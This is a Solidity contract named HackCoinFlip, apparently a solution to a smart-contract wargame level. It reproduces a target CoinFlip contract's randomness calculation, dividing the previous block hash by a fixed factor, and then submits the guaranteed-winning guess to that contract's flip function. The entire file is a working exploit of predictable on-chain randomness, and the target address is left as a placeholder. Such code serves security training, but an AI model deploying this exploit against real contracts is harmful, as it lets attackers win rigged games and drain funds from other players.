pragma solidity ^0.4.19;

import '/Coinflip.sol';


contract HackCoinFlip {
	CoinFlip public originalContract;
	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

	constructor() public {
		originalContract = CoinFlip(/* CONTRACT ADDRESS */);
	}

	function hackFlip(bool _guess) public {
		// pre-determine the flip outcome
		uint256 blockValue = uint256(block.blockhash(block.number-1));
		uint256 coinFlip = blockValue / FACTOR;
		bool side = coinFlip == 1 ? true : false;

		// If I guessed correctly, submit my guess
		if (side == _guess) {
		    originalContract.flip(_guess);
		} else {
		// If I guess incorrectly, submit the opposite
		    originalContract.flip(!_guess);
		}
	}
}	